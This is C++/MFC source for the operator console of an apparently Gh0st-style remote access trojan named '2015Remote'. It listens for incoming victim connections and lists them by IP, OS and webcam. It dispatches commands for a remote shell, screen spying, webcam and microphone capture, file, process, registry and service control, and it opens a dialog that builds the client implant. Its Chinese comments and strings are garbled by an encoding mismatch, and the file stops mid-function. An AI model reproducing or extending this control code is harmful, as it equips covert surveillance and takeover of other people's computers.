
// 2015RemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define UM_ICONNOTIFY WM_USER+100
enum
{
	ONLINELIST_IP=0,          //IP����˳��
	ONLINELIST_ADDR,          //��ַ
	ONLINELIST_COMPUTER_NAME, //�������/��ע
	ONLINELIST_OS,            //����ϵͳ
	ONLINELIST_CPU,           //CPU
	ONLINELIST_VIDEO,         //����ͷ(����)
	ONLINELIST_PING           //PING(�Է�������)
};


typedef struct
{
	char*   szTitle;           //�б������
	int		nWidth;            //�б�Ŀ��
}COLUMNSTRUCT;


COLUMNSTRUCT g_Column_Data_Online[] = 
{
	{"IP",			148	},
	{"����",			150	},
	{"�������/��ע",	160	},
	{"����ϵͳ",		128	},
	{"CPU",			80	},
	{"����ͷ",		81	},
	{"PING",			151	}
};

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���
int  g_Column_Count_Online  = 7;



COLUMNSTRUCT g_Column_Data_Message[] = 
{
	{"��Ϣ����",		200	},
	{"ʱ��",			200	},
	{"��Ϣ����",	    490	}
};

int g_Column_Count_Message = 3;   //�б�ĸ���


int g_Column_Online_Width  = 0; 
int g_Column_Message_Width = 0; 
IOCPServer *m_iocpServer   = NULL;  
CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING  
};

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg �Ի���




CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);



	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);

	m_iCount = 0;

}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_ONLINE_ABOUT,&CMy2015RemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //����Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
	ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList) 
	
	
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog) 
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
END_MESSAGE_MAP()


// CMy2015RemoteDlg ��Ϣ�������
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: 
	case WM_LBUTTONDBLCLK: 
		{
			if (!IsWindowVisible())
			{
				ShowWindow(SW_SHOW);
			}
			else
			{
				ShowWindow(SW_HIDE);
			}
			break;
		}
	
	case WM_RBUTTONDOWN:
		{
			CMenu Menu;
			Menu.LoadMenu(IDR_MENU_NOTIFY);
			CPoint Point;
			GetCursorPos(&Point);
			SetForegroundWindow();   //���õ�ǰ����
			Menu.GetSubMenu(0)->TrackPopupMenu(
				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
				Point.x, Point.y, this, NULL); 
		
			break;
		}
		
	}
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{

	HMENU hMenu;   //SDK  C   MFC  C++
	hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //����˵���Դ
	::SetMenu(this->GetSafeHwnd(),hMenu);                    //Ϊ�������ò˵�
	::DrawMenuBar(this->GetSafeHwnd());                      //��ʾ�˵�

}



VOID CMy2015RemoteDlg::CreatStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))                    //����״̬���������ַ���Դ��ID
	{
		return ;      
	}

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{


	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //��С��ֵ
	m_Nid.hWnd = m_hWnd;           //������    �Ǳ������ڸ���CWnd����
	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //������ӵ�е�״̬
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //�ص���Ϣ
	m_Nid.hIcon = m_hIcon;                               //icon ����
	CString strTips ="2015RemoteԶ��Э�����.........";       //������ʾ
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //��ʾ����

}

VOID CMy2015RemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //����һ��������  ������Դ
	{

		return;     
	}
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //�����ǵ�λͼ��Դ�����
	RECT Rect,RectMain;
	GetWindowRect(&RectMain);   //�õ��������ڵĴ�С
	Rect.left=0;
	Rect.top=0;
	Rect.bottom=80;
	Rect.right=RectMain.right-RectMain.left+10;
	m_ToolBar.MoveWindow(&Rect,TRUE);



	


	m_ToolBar.SetButtonText(0,"�ն˹���");     //��λͼ����������ļ�
	m_ToolBar.SetButtonText(1,"���̹���"); 
	m_ToolBar.SetButtonText(2,"���ڹ���"); 
	m_ToolBar.SetButtonText(3,"�������"); 
	m_ToolBar.SetButtonText(4,"�ļ�����"); 
	m_ToolBar.SetButtonText(5,"��������"); 
	m_ToolBar.SetButtonText(6,"��Ƶ����"); 
	m_ToolBar.SetButtonText(7,"�������"); 
	m_ToolBar.SetButtonText(8,"ע������"); 
	m_ToolBar.SetButtonText(9,"��������"); 
	m_ToolBar.SetButtonText(10,"���ɷ����"); 
	m_ToolBar.SetButtonText(11,"����"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //��ʾ
}


VOID CMy2015RemoteDlg::InitControl()
{
	
	/*
		SendMessage(synchronization)  PostMessage(asynchronization)

		//ר������
	*/

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);


/*	m_CList_Online.InsertColumn(0, "����", LVCFMT_LEFT, 100);   
	m_CList_Online.InsertColumn(1, "��ͥסַ", LVCFMT_LEFT, 100);
	m_CList_Online.InsertColumn(2, "�绰����", LVCFMT_LEFT, 100);*/



	for (int i = 0;i<g_Column_Count_Online;i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);


		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth; 
	

	}
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);


	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);

			
		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}

	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	SetTimer(0,3000,NULL);
}


VOID CMy2015RemoteDlg::TestOnline()
{
//	AddList("1","����������","�й�","Windows7","2.2GHZ","��","1000");
//	AddList("2","����������","�ձ�","Windows7","2.2GHZ","��","1000");
//	AddList("3","����������","����","Windows7","2.2GHZ","��","1000");
	ShowMessage(true,"�����ʼ���ɹ�...");
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,CONTEXT_OBJECT* ContextObject)
{
			
	
	//Ĭ��Ϊ0��  �������в�������ж���������
	
	 int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(),strIP);

	m_CList_Online.SetItemText(i,ONLINELIST_ADDR,strAddr);      
	m_CList_Online.SetItemText(i,ONLINELIST_COMPUTER_NAME,strPCName); 
	m_CList_Online.SetItemText(i,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(i,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(i,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 

	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
	ShowMessage(true,strIP+"��������"); 
}


VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CString strIsOK,strTime;
	CTime Timer =CTime::GetCurrentTime();          //����һ��CTime ���һ������ t ʹ�����еĳ�Ա����GetCurrentTime() ������ SDK����
	strTime= Timer.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOK="ִ�гɹ�";
	}
	else
	{
		strIsOK="ִ��ʧ��";
	}
	m_CList_Message.InsertItem(0,strIsOK);    //��ؼ�����������
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);


	CString strStatusMsg;
	if (strMsg.Find("����")>0)         //�������߻���������Ϣ
	{
		m_iCount++;
	}else if (strMsg.Find("����")>0)
	{
		m_iCount--;
	}else if (strMsg.Find("�Ͽ�")>0)
	{
		m_iCount--;
	}

	m_iCount=(m_iCount<=0?0:m_iCount);         //��ֹiCount ��-1�����


	strStatusMsg.Format("��%d����������",m_iCount);
	m_StatusBar.SetPaneText(0,strStatusMsg);   //��״̬������ʾ����



}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	g_2015RemoteDlg = this;
	CreateToolBar();
	InitControl();

	CreatStatusBar();

//	TestOnline();

	CreateNotifyBar();

	CreateSolidMenu();

	ListenPort();


//	SetTimer(1,8000,NULL);

	
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}



void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CMy2015RemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	if (SIZE_MINIMIZED==nType)
	{
		return;
	} 
	if (m_CList_Online.m_hWnd!=NULL)   //���ؼ�Ҳ�Ǵ������Ҳ�о����
	{
		CRect rc;
		rc.left = 1;          //�б��������     
		rc.top  = 80;         //�б��������
		rc.right  =  cx-1;    //�б��������
		rc.bottom = cy-160;   //�б��������
		m_CList_Online.MoveWindow(rc);


		for(int i=0;i<g_Column_Count_Online;i++){           //����ÿһ����
			double Temp=g_Column_Data_Online[i].nWidth;     //�õ���ǰ�еĿ��   138
			Temp/=g_Column_Online_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp*=cx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth = Temp;                               //ת��Ϊint ����
			m_CList_Online.SetColumnWidth(i,(lenth));       //���õ�ǰ�Ŀ��
		}
	}


	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;         //�б��������
		rc.top = cy-156;     //�б��������
		rc.right  = cx-1;    //�б��������
		rc.bottom = cy-20;   //�б��������
		m_CList_Message.MoveWindow(rc);
		for(int i=0;i<g_Column_Count_Message;i++){           //����ÿһ����
			double Temp=g_Column_Data_Message[i].nWidth;     //�õ���ǰ�еĿ��
			Temp/=g_Column_Message_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp*=cx;                                        //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth=Temp;                                  //ת��Ϊint ����
			m_CList_Message.SetColumnWidth(i,(lenth));        //���õ�ǰ�Ŀ��
		}
	}

	if(m_StatusBar.m_hWnd!=NULL){    //���Ի����С�ı�ʱ ״̬����СҲ��֮�ı�
		CRect Rect;
		Rect.top=cy-20;
		Rect.left=0;
		Rect.right=cx;
		Rect.bottom=cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}


	if(m_ToolBar.m_hWnd!=NULL)                  //������
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //���ù�������Сλ��
	}

}


void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	switch(nIDEvent)
	{

	case 0:
		{
	//		MessageBox("0","0");
			break;
		}

	case 1:
		{

//			MessageBox("1","1");
			break;
		}
	}

	//MessageBox("1","1");

	/*static  int i = 0;

	i++;

	CString  strTips;
	strTips.Format("%d",i);

	SetWindowText(strTips.GetBuffer(0));
	UpdateData(FALSE);
	CDialogEx::OnTimer(nIDEvent);*/
}


void CMy2015RemoteDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	KillTimer(0);
	if (::MessageBox(NULL,"��ȷ��?","2015Remote",MB_OKCANCEL)==1)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_Nid);


		if (m_iocpServer!=NULL)
		{
			delete m_iocpServer;
			m_iocpServer = NULL;
		}
		CDialogEx::OnClose();
	}
	else
	{

	}
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	//�����˵�

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //���ز˵���Դ   ��Դ����������
	
	CMenu*	SubMenu = Menu.GetSubMenu(0);    

	
	CPoint	Point;    
	GetCursorPos(&Point);


	int	iCount = SubMenu->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)         //���û��ѡ��
	{ 
		for (int i = 0;i<iCount;i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}

	}

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);


	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
	BYTE bToken = COMMAND_TALK;   //�򱻿ض˷���һ��COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}


void CMy2015RemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������
	

	BYTE bToken = COMMAND_BYE;   //�򱻿ض˷���һ��COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	CString  strIP;
	int iCount = m_CList_Online.GetSelectedCount();
	int i = 0;


	for (i=0;i<iCount;i++)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
		m_CList_Online.DeleteItem(iItem);
		strIP+="�Ͽ�����";
		ShowMessage(true,strIP);
	}



/*	
	int iItem = m_CList_Online.GetSelectionMark();

	if (iItem<0)
	{
		return;
	}

	strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  

	m_CList_Online.DeleteItem(iItem);

	strIP+="�Ͽ�����";
	ShowMessage(true,strIP); */   	
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
	BYTE	bToken = COMMAND_SHELL;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}



VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
	BYTE	bToken = COMMAND_WSLIST;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{	
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
//	MessageBox("1","1");


	BYTE	bToken = COMMAND_LIST_DRIVE;  //���̾������豸      
	//�򱻿ض˷�����ϢCOMMAND_LIST_DRIVE �ڱ��ض�������COMMAND_LIST_DRIVE

	SendSelectedCommand(&bToken, sizeof(BYTE));

}
VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;                 //�򱻿ض˷�������
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{

	BYTE	bToken = COMMAND_WEBCAM;                 //�򱻿ض˷�������
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;         //��ֵһ���� Ȼ���͵�����ˣ������������COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
	// TODO: �ڴ���������������
	//MessageBox("���ɷ����");
	CBuildDlg Dlg;
	Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{

	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();   //1[pcontext client]  2  3   //1    2
	while(Pos) 
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);      
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem); //���б���Ŀ��ȡ��ClientContext�ṹ��


		// ���ͻ���������б����ݰ�                                                 //�鿴ClientContext�ṹ��
		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);         //Cleint   Context

	} 
}




//���Bar
VOID CMy2015RemoteDlg::OnAbout()
{
	MessageBox("1","1");

	m_ToolBar.SetButtonText(0,"Terminal");     //��λͼ����������ļ�
}

//����Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
	// TODO: �ڴ���������������

	SendMessage(WM_CLOSE);
}




//��̬�˵�
void CMy2015RemoteDlg::OnMainSet()
{
	CSettingDlg  Dlg;

	Dlg.DoModal();   //ģ̬ ����
}


void CMy2015RemoteDlg::OnMainExit()
{
	// TODO: �ڴ���������������
	SendMessage(WM_CLOSE);
}




VOID CMy2015RemoteDlg::ListenPort()
{
	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("Settings", "ListenPort");         
	//��ȡini �ļ��еļ����˿�
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("Settings", "MaxConnection");    
	//��ȡ���������
	if (nPort == 0)
		nPort = 2356;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort,nMaxConnection);             //��ʼ����
}


VOID CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
{

	m_iocpServer = new IOCPServer;                //��̬�������ǵ������

	if (m_iocpServer==NULL)
	{
		return;
	}


	if (m_iocpServer->StartServer(NotifyProc,nPort)==TRUE)
	{
	}




	CString strTemp;
	strTemp.Format("�����˿�: %d�ɹ�", nPort);
	ShowMessage(true,strTemp);
}




VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	
		
	MessageHandle(ContextObject);
	
	
	

}
	

VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{

	if (ContextObject == NULL)
	{
		return;  //int �� intDlgHwnd
	}


	if (ContextObject->v1 > 0)
	{
		

		switch(ContextObject->v1)
		{
		case VIDEO_DLG:
			{


				CVideoDlg *Dlg = (CVideoDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();

				break;
			}
		case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}

		
		}
		return;
	}

	switch (ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case COMMAND_BYE:
		{
			CancelIo((HANDLE)ContextObject->sClientSocket);
			closesocket(ContextObject->sClientSocket); 
			Sleep(10);

			break;
		}
	case TOKEN_LOGIN: // ���߰�  shine
		{
			//���ﴦ������
		//	if (m_iocpServer->m_nMaxConnections <= g_ControlServerDlg->m_CList_Online.GetItemCount())    
		//	{
		//		closesocket(pContext->m_Socket); 
		//	}
		//	else
			{
			//	pContext->m_bIsMainSocket = true;    //����   AddTail
				g_2015RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject);      //�򴰿�Ͷ���û����ߵ���Ϣ 


			//	BYTE	bToken = COMMAND_ACTIVED;
			//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));   //shine       
			}

			break;
		}

	case TOKEN_BITMAPINFO:
		{


			g_2015RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}
	case TOKEN_DRIVE_LIST:
		{


			g_2015RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}

	case TOKEN_TALK_START:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}

	case TOKEN_SHELL_START:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);   
			break;
		}
	case TOKEN_WSLIST:  //wndlist
	case TOKEN_PSLIST:  //processlist
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);      //�򿪽���ö�ٵĶԻ���

			break;
		}

	case TOKEN_AUDIO_START:
		{
			
			g_2015RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);  
			break;
		}

	case TOKEN_REGEDIT:
		{                            
			g_2015RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);  
			break;
		}

